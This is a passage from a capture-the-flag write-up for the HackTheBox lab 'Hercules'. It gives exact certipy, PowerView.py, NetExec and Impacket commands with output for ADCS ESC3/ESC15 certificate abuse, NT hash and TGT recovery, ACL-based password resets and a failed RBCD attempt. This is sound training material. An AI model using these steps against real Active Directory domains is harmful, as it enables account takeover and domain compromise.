                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

---
#### ESC3 Exploitation (Enrollment Agent Certificate Template)

Just like `BloodHound` and `certipy` showed us, we have a possible `ADCSESC3` we could try to exploit to request a certificate on behalf of someone else. We can follow Certipy's official guide [ESC3 - Enrollment Agent Certificate Template](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template).

On our first attempt, we tried to request a certificate on behalf of `Administrator` through the `-on-behalf-of` flag following the `ADCSESC3`. The result returned (`The operation is denied. It can only be performed by a certificate manager that is allowed to manage certificates for the current requester`). This message tells us we have the permissions to request a certificate for that user.

We also tried requesting certificates on behalf of other users that could be of interest, like `IIS_Administrator`, `IIS_WebServer$` or `admin`, but got the same result.

> ESC3 vulnerabilities exploit weaknesses tied to **Certificate Request Agents**, also known as **Enrollment Agents**. An **Enrollment Agent** is an account authorized to request certificates on behalf of other users. This functionality is legit in scenarios like **helpdesk** staff enrolling **smart cards** for users, or automated certificate provisioning systems. However, if an attacker gets their hands on an active **Enrollment Agent** certificate, or can enroll for a new **Enrollment Agent** certificate due to misconfigured template permissions, they can abuse this privilege to get certificates for other users, including highly privileged accounts like **Domain Administrators**.
{: .prompt-info }

```bash
❯ certipy req -u 'fernando.r@hercules.htb' -k -no-pass -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dc-host DC -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'

❯ certipy req -k -no-pass -pfx fernando.r.pfx -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'User' -on-behalf-of 'hercules\Administrator' -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via DCOM
[*] Request ID is 22
[-] Got error while requesting certificate: code: 0x80094009 - CERTSRV_E_RESTRICTEDOFFICER - The operation is denied. It can only be performed by a certificate manager that is allowed to manage certificates for the current requester.
Would you like to save the private key? (y/N): N
```

Remembering the email we got that mentioned `ashley.b`, we decide to try with her.

The first step is to get an `Enrollment Agent` certificate: using `fernando.r`, who's in the `SMARTCARD OPERATORS` group, we'll request the certificate from the `EnrollmentAgent` template. We finally get the `fernando.r.pfx` certificate.

> If you hit the error below, you'll need to add the `-dcom` flag to request the certificate over DCOM instead of RPC.
_RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed._
{: .prompt-info }

```bash
❯ certipy req -u 'fernando.r@hercules.htb' -k -no-pass -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dc-host DC -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

The next step is to use the `Enrollment Agent` certificate (`fernando.r`) to request a certificate on behalf of the target user. We'll use the PFX certificate from `fernando.r.pfx` (the cert we got in the previous step) to request a certificate through the `User` template on behalf of `HERCULES\ashley.b` via the `-on-behalf-of` flag.

We confirm we finally get a PFX certificate for `ashley.b`.

> Remember to use the `-dcom` flag to request the certificate over DCOM and not RPC.
{: .prompt-info }

```bash
❯ certipy req -k -no-pass -pfx fernando.r.pfx -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'User' -on-behalf-of 'hercules\ashley.b' -dc-host DC -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

Once we have the target user's certificate, we'll authenticate with `certipy auth` using `ashley.b`'s certificate to recover her NTLM hash and TGT (`.ccache`). We finally get her credentials.

```bash
❯ certipy auth -pfx ashley.b.pfx -domain hercules.htb -ns $IP -dc-ip $IP
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

We'll validate `ashley.b`'s credentials with `NetExec`. The credentials check out and we can now act as `ashley.b`.

```bash
❯ nxc ldap $IP -u 'ashley.b' -H '1e719fbfddd226da74f644eac9df7fd2' -k
LDAP        10.129.145.12   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.145.12   389    DC               [+] hercules.htb\ashley.b:1e719fbfddd226da74f644eac9df7fd2 
```

---
#### ESC15 Exploitation (Arbitrary Application Policy Injection in V1 Templates)

On the other hand, `certipy find` flagged the `EnrollmentAgentOffline` template as potentially vulnerable to `ESC3` and `ESC15`. In our case, for `ESC3` we used the `EnrollmentAgent` template, but this time we'll try with `EnrollmentAgentOffline`.

We'll follow Certipy's official GitHub guide [Arbitrary Application Policy Injection in V1 Templates](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu). We'll follow `Scenario B`.

> **ESC15**, also known by the community name "**EKUwu**" (research by Justin Bollinger from TrustedSec) and registered as **CVE-2024-49019**, describes a vulnerability affecting unpatched **CAs**. It lets an attacker inject arbitrary **Application Policies** into a certificate issued from a **Version 1 (Schema V1)** certificate template. If the **CA** hasn't been updated with the relevant security patches (November 2024), it will incorrectly include these attacker-supplied **Application Policies** in the issued certificate. This happens even if these policies aren't defined in, or are inconsistent with, the template's intended **Extended Key Usages (EKUs)**, thereby granting the certificate unintended capabilities.
>
>For example, an attacker could request a certificate from a V1 "**WebServer**" template (which normally only allows the "**Server Authentication**" EKU) and, through this vulnerability, inject the "**Client Authentication**" **OID** (1.3.6.1.5.5.7.3.2) as an **Application Policy**. The resulting certificate could then potentially be used for client login, against the template's design. This attack is similar in principle to **ESC1** (abusing `Enrollee Supplies Subject` for the **SAN**) or **ESC2** (abusing the `Any Purpose` EKU), but it specifically leverages the **szOID_APPLICATION_CERT_POLICIES** (**Application Policies**) certificate extension.
>
>**ESC15 prerequisite**: Based on the current understanding and exploitation details, this vulnerability seems to mainly affect **Version 1** templates that also have the "**Enrollee supplies subject**" setting (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) enabled. This combination lets the attacker supply subject info (which might be needed for the target use case) along with the malicious **Application Policies** in the **CSR**.
{: .prompt-info }

We'll request a certificate from a `V1 Template` (with `EnrolleeSuppliesSubject`) injecting the `"Certificate Request Agent" Application Policy`. This certificate is so the attacker (`fernando.r`) becomes an enrollment agent.

```bash
❯ certipy req -u 'fernando.r@hercules.htb' -k -no-pass -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'EnrollmentAgentOffline' -dc-host DC -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 30
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

We'll use this "agent" certificate to request a certificate on behalf of another user, like `ashley.b`. The steps are similar to an `ESC3`. We finally get a certificate for our target user.

> If you get the error below, you'll need to tell it to use the DCOM protocol via the `-dcom` flag.
>
>_RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed._
{: .prompt-info }

```bash
❯ certipy req -pfx fernando.r.pfx -k -no-pass -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'User' -dc-host DC -on-behalf-of 'hercules\ashley.b'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[-] Got error while requesting certificate: code: 0x80010117 - RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed.
Would you like to save the private key? (y/N): N
[-] Failed to request certificate

❯ certipy req -pfx fernando.r.pfx -k -no-pass -dc-ip $IP -target 'DC.hercules.htb' -ca 'CA-HERCULES' -template 'User' -dc-host DC -on-behalf-of 'hercules\ashley.b' -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 32
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

We'll use `ashley.b`'s certificate to authenticate with `certipy auth` and finally recover her NTLM hash and TGT (`.ccache`).

```bash
❯ certipy auth -pfx ashley.b.pfx -domain hercules.htb -ns $IP -dc-ip $IP
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

We'll export the TGT that `certipy` generated into the `KRB5CCNAME` variable and verify with `klist` that the ticket imported correctly into our session.

```bash
❯ export KRB5CCNAME=$(pwd)/ashley.b.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/ashley.b.ccache
Default principal: ashley.b@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 07:24:53  10/21/2025 17:24:53  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 07:24:53
```

---
## Auth as IIS_Administrator

### Abusing Scheduled Tasks and GenericAll on OU for Password Reset Control

Remember `ashley.b` is part of the `REMOTE MANAGEMENT USERS` group, so we should be able to authenticate to the Domain Controller over WinRM. We'll use `winrmexec.py` and finally confirm access.

```powershell
❯ winrmexec.py -k -no-pass 'dc.hercules.htb' -dc-ip $IP -ssl -port 5986
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB
PS C:\Users\ashley.b\Documents>
```

Checking the files `ashley.b` has on her desktop, we find the `aCleanup.ps1` script mentioned earlier, plus an email at `C:\Users\ashley.b\Desktop\Mail\RE_ashley.eml`.

```powershell
PS C:\Users\ashley.b\Desktop> tree /f /a
Folder PATH listing
Volume serial number is 0A8A-BD1A
C:.
|   aCleanup.ps1
|   
\---Mail
        RE_ashley.eml
```

Going over the email on `ashley.b`'s desktop, we find a conversation between _Ashley Browne_ and _Domain Admins_ about a failure while trying to reset the password of the user `will.s` (`Engineering`). The admins say the apparent cause is past memberships in sensitive groups that are blocking the permissions. As a fix, the Domain Admins copied a script to Ashley's home folder and left a shortcut in the IT share, also suggesting running it via PowerShell or through the scheduled task.

```powershell
PS C:\Users\ashley.b\Desktop> type Mail/RE_ashley.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
	boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hello Ashley,

The issue you are facing is that some members in the Department were once p=
art of sensitive groups which are blocking your permissions.

I've discussed your issue at length with security and here is a solution th=
at we feel works for both us and your team. I've attached a copy of the scr=
ipt your team should run to your home folder. For convenience, We have prov=
ided a shortcut to the script in the IT share. You may also run the task ma=
nually from powershell.

If you have any other issues feel free to inform me.

Regards, Domain Admins.

________________________________
From: Ashley Browne
Sent: Monday 09:49:37 AM
To: Domain Admins <Administrator@HERCULES.HTB>
Subject: Unable to reset user's password.

Good Morning,

Today one of my staff received a password reset request from a user, but fo=
r some reason they were unable to perform the action due to invalid permiss=
ions. I have double checked against another user and confirmed our team has=
permission to handle password changes in the department the user belongs to=
. I was told to contact you for further assistance.

For reference the user is "will.s" from the "Engineering Department" Unit.

I look forward to your reply.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

On the other hand, checking the `aCleanup.ps1` script we see it starts a scheduled task called `Password Cleanup`.

```powershell
PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

Digging deeper into that scheduled task, we find its description is `Attribute Cleanup for IT Support.` and the action it runs is a script at `C:\Users\Administrator\AppData\Local\Windows\PasswordCleanup.ps1`.

```powershell
PS C:\Users\ashley.b\Desktop> Get-ScheduledTask -TaskName "Password Cleanup" | Format-List *


State                 : Ready
Actions               : {MSFT_TaskExecAction}
Author                : 
Date                  : 
Description           : Attribute Cleanup for IT Support.
Documentation         : 
Principal             : MSFT_TaskPrincipal2
SecurityDescriptor    : 
Settings              : MSFT_TaskSettings3
Source                : 
TaskName              : Password Cleanup
TaskPath              : \
Triggers              : 
URI                   : \Password Cleanup
Version               : 
PSComputerName        : 
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_ScheduledTask
CimInstanceProperties : {Actions, Author, Date, Description...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties


PS C:\Users\ashley.b\Desktop> (Get-ScheduledTask -TaskName "Password Cleanup").Actions


Id               : 
Arguments        : -File "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
Execute          : powershell.exe
WorkingDirectory : 
PSComputerName   : 
```

`ashley.b` is a member of the `IT SUPPORT` group, whose members have the `ForceChangePassword` privilege over several users, including the one mentioned as an example in the email: `will.s`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021075655.png)

The main idea, as we saw, is to run the script the Domain Admins left to avoid the problems caused by accounts that were once part of sensitive groups and now block permissions — for example `IIS_Administrator`, whose adminCount is set to `True`.

`ashley.b` can't change `IIS_Administrator`'s password directly, but she does have the script that restores/remediates permissions and a shortcut in the IT share.

Goal and flow:

- We have `auditor` with `genericAll` over the OU where `IIS_Administrator` sits.

- `ashley.b` has the script in her profile (and a shortcut in the share) to "reset" the permissions blocking password resets.

- We run the script mentioned in the email from the appropriate context.

- Using `auditor`'s delegation, we make sure the IT group (or `ashley.b`, depending on the script flow) gets `FullControl` over the inheritance/ACL of the OU containing `IIS_Administrator`.

- With the inheritance/ACL fixed by the script and control secured over the OU, `ashley.b` goes ahead and changes `IIS_Administrator`'s password.

On top of that, checking the `IIS_Administrator` user we're interested in to keep pushing the path we found earlier, we confirm his account is disabled.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021081457.png)

From the terminal under `ashley.b`'s context, we'll run the `aCleanup.ps1` script.

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

From the `PowerView.py` terminal we have with `auditor`, we'll grant `FullControl` again over the `FOREST MIGRATION` OU in `Inheritance` mode to get full control of the container's child objects.

We confirm the permissions are granted again, but when we try to reset `IIS_Administrator`'s credentials with `auditor`, we get `INSUFF_ACCESS_RIGHTS`.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -PrincipalIdentity auditor -Rights FullControl -Inheritance -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB"
[2025-10-21 08:06:57] [Add-DomainObjectACL] Found target identity: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:06:57] [Add-DomainObjectACL] Found principal identity: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:06:57] Objects with adminCount=1 will not inherit ACEs from their parent container/OU
[2025-10-21 08:06:57] Adding FullControl to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:06:57] [Add-DomainObjectACL] Success! Added ACL to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity IIS_Administrator -AccountPassword Gzzcoo123
[2025-10-21 08:07:03] [Set-DomainUserPassword] Principal CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb found in domain
[2025-10-21 08:07:03] LDAPInsufficientAccessRightsResult - 50 - insufficientAccessRights - None - 00000005: SecErr: DSID-031A11EF, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
 - modifyResponse - None
```

We'll try the same process but with `ashley.b`, granting her the `FullControl` permissions over the OU. Again, we'll run the `aCleanup.ps1` script under `ashley.b`'s context.

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

From the `PowerView.py` console as `auditor`, we'll once again grant the `FullControl` permissions over the `FOREST MIGRATION` OU.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -PrincipalIdentity ashley.b -Rights FullControl -Inheritance -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB"
[2025-10-21 08:08:42] [Add-DomainObjectACL] Found target identity: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:08:42] [Add-DomainObjectACL] Found principal identity: CN=Ashley Browne,OU=Hades Employees,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:08:42] Objects with adminCount=1 will not inherit ACEs from their parent container/OU
[2025-10-21 08:08:42] Adding FullControl to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:08:42] [Add-DomainObjectACL] Success! Added ACL to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Once the permissions are granted, from the `PowerView.py` terminal as `ashley.b`, we try to reset `IIS_Administrator`'s credentials, getting the same result.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\ashley.b]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity IIS_Administrator -AccountPassword Gzzcoo123
[2025-10-21 08:08:43] LDAPInsufficientAccessRightsResult - 50 - insufficientAccessRights - None - 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
 - modifyResponse - None
```

Just like the description of the `Password Cleanup` scheduled task said, it's a task designed for the `IT SUPPORT` group, which `ashley.b` is also a member of. So we'll repeat the previous process but grant the permissions over that group instead.

To do that, once more we'll run the `aCleanup.ps1` script from the terminal where we're `ashley.b`.

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

Through the `PowerView.py` session we have with `auditor`, we'll grant `FullControl` over the `FOREST MIGRATION` OU in `Inheritance` mode so the `IT SUPPORT` group has full control over that container's objects. We confirm the `ACL` was added correctly via `Add-DomainObjectAcl`.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -PrincipalIdentity 'CN=IT SUPPORT,OU=DOMAIN GROUPS,OU=DCHERCULES,DC=HERCULES,DC=HTB' -Rights FullControl -Inheritance -TargetIdentity 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB'
[2025-10-21 08:11:45] [Add-DomainObjectACL] Found target identity: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:11:45] [Add-DomainObjectACL] Found principal identity: CN=IT Support,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:11:45] Objects with adminCount=1 will not inherit ACEs from their parent container/OU
[2025-10-21 08:11:45] Adding FullControl to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:11:45] [Add-DomainObjectACL] Success! Added ACL to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Back in our `PowerView.py` session under `ashley.b`'s context, when we try to reset `IIS_Administrator`'s credentials, we confirm the change goes through.

On top of that, we'll enable the `IIS_Administrator` account, which was disabled.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\ashley.b]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity IIS_Administrator -AccountPassword Gzzcoo123
[2025-10-21 08:12:34] [Set-DomainUserPassword] Principal CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb found in domain
[2025-10-21 08:12:34] [Set-DomainUserPassword] Password has been successfully changed for user iis_administrator
[2025-10-21 08:12:34] Password changed for IIS_Administrator

╭─LDAPS─[dc.hercules.htb]─[HERCULES\ashley.b]-[NS:<auto>]
╰─PV ❯ Enable-ADAccount -Identity IIS_Administrator
[2025-10-21 08:11:49] [Set-DomainObject] Success! modified attribute userAccountControl for CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 08:11:49] [Enable-ADAccount] Account iis_administrator enabled
```

Once `IIS_Administrator`'s credentials have been changed, we'll verify they're valid to authenticate to the LDAP service with `NetExec`.

```bash
❯ nxc ldap $IP -u 'IIS_Administrator' -p 'Gzzcoo123' -k
LDAP        10.129.145.12   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.145.12   389    DC               [+] hercules.htb\IIS_Administrator:Gzzcoo123 
```

We'll request a TGT (Ticket Granting Ticket) for `IIS_Administrator` so we can authenticate over Kerberos. We'll export the TGT (`.ccache`) into the `KRB5CCNAME` variable and verify with `klist`.

```powershell
❯ getTGT.py hercules.htb/IIS_Administrator:'Gzzcoo123' -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_Administrator.ccache

❯ export KRB5CCNAME=$(pwd)/IIS_Administrator.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/IIS_Administrator.ccache
Default principal: IIS_Administrator@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 08:16:09  10/21/2025 18:16:09  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 08:16:09
```

----
## Auth as IIS_WebServer$

### Abusing ForceChangePassword privileges to reset password for a user

In our `BloodHound` enumeration, we found `IIS_Administrator` is a member of the `SERVICE OPERATORS` group, whose members can reset `IIS_WEBSERVER$`'s credentials through the `ForceChangePassword` permission.

> This permission grants the right to change a user account's password without knowing its current one. As a result, attackers can use this access to carry out unauthorized actions.
>
>Moreover, this abuse can be done when you control an object that has **GenericAll**, **AllExtendedRights**, or **User-Force-Change-Password** over the target user.
>
>Via: [Hacking Articles](https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/)
{: .prompt-info }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251023204848.png)

We'll use `IIS_Administrator`'s credentials to connect to a `PowerView.py` session, aiming to abuse the user's `ForceChangePassword` ACL.

Through `Set-DomainUserPassword` we finally manage to reset `IIS_WEBSERVER$`'s credentials.

```powershell
❯ powerview hercules.htb/IIS_Administrator@dc.hercules.htb --dc-ip $IP -ns dc.hercules.htb -k --no-pass
Logging directory is set to /root/.powerview/logs/hercules-iis_administrator-dc.hercules.htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\iis_administrator]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity IIS_WEBSERVER$ -AccountPassword Gzzcoo123
[2025-10-21 08:17:23] [Set-DomainUserPassword] Principal CN=IIS_Webserver$,OU=IIS Service Users,OU=DCHERCULES,DC=hercules,DC=htb found in domain
[2025-10-21 08:17:24] [Set-DomainUserPassword] Password has been successfully changed for user iis_webserver$
[2025-10-21 08:17:24] Password changed for IIS_WEBSERVER$
```

We'll confirm the credentials are valid at domain level and we can now authenticate under `IIS_WEBSERVER$`'s context.

```powershell
❯ nxc ldap $IP -u 'IIS_WEBSERVER$' -p 'Gzzcoo123' -k
LDAP        10.129.145.12   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.145.12   389    DC               [+] hercules.htb\IIS_WEBSERVER$:Gzzcoo123 
```

We'll request a TGT (Ticket Granting Ticket) for `IIS_WEBSERVER$` supplying the modified credentials, export the TGT into the `KRB5CCNAME` variable and check with `klist`.

```powershell
❯ getTGT.py hercules.htb/'IIS_WEBSERVER$':'Gzzcoo123' -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_WEBSERVER$.ccache

❯ export KRB5CCNAME=$(pwd)/'IIS_WEBSERVER$.ccache'

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/IIS_WEBSERVER$.ccache
Default principal: IIS_WEBSERVER$@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 08:18:26  10/21/2025 18:18:26  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 08:18:25
```

----
## Shell as Administrator

### Attempting to perform RBCD

At this point we have `IIS_WEBSERVER$`'s credentials. The next step is to try exploiting the `Resource-Based Constrained Delegation (RBCD)` we have, since that user holds `AllowedToAct` over the Domain Controller.

> **Constrained delegation** is configured on a front-end service and defines which back-end services it can delegate to. Modifying the `msDS-AllowedToDelegateTo` attribute of a service account (user or machine) requires the `SeEnableDelegationPrivilege` user right on the domain controllers, which is only granted to enterprise and domain admins. Microsoft saw this as a problem because service administrators had no useful way to know which front-end services delegated to the resources they were responsible for.
>
>Windows 2012 introduced another form of delegation called **resource-based constrained delegation** (often shortened to **RBCD**), which puts delegation control in the hands of the service administrators (e.g. it no longer requires `SeEnableDelegationPrivilege` to configure it). Now, instead of a front-end service dictating which back-end it can delegate to, it's the back-end service that controls which front-end services can delegate to it.
>
>This is controlled by defining the front-end service accounts in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the service account running the back-end. The only privilege required is **write** access to that attribute, which is usually granted to an appropriate domain group via the Delegation of Control Wizard.
{: .prompt-info }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251023204947.png)

When we try the `Resource-Based Constrained Delegation (RBCD)` attack to impersonate `Administrator` and request a TGS (Ticket Granting Service) for the `cifs/dc.hercules.htb` service, we get `KDC_ERR_S_PRINCIPAL_UNKNOWN`.

This message means the `Key Distribution Center (KDC)` can't find the service account (Principal) the client is requesting in its Active Directory database. In short, the `IIS_WEBSERVER$` account doesn't have a `servicePrincipalName (SPN)` assigned.

> Abusing **RBCD** isn't the same as with the other delegation variants, in the sense that compromising the front-end service does **not** automatically lead to compromising the back-end service. However, an adversary can leverage **RBCD** to get access to **any** machine if the following conditions are met:
>
>- They have **write access** to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a computer object.
>
>- They control another principal that has an **SPN** configured.
{: .prompt-info }

```powershell
❯ getST.py hercules.htb/'IIS_WEBSERVER$' -spn 'cifs/dc.hercules.htb' -impersonate Administrator -dc-ip $IP -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user IIS_WEBSERVER$ does not have constrained delegation permisions or impersonated user does not exist
```

With `ldapsearch` we run a query to look for `servicePrincipalName`s; from the output we can't find an `SPN` for `IIS_WEBSERVER$`.

```bash
❯ ldapsearch -H ldap://dc.hercules.htb -Y GSSAPI -b "DC=hercules,DC=htb" "(&(objectClass=*)(servicePrincipalName=*))" servicePrincipalName | grep servicePrincipalName
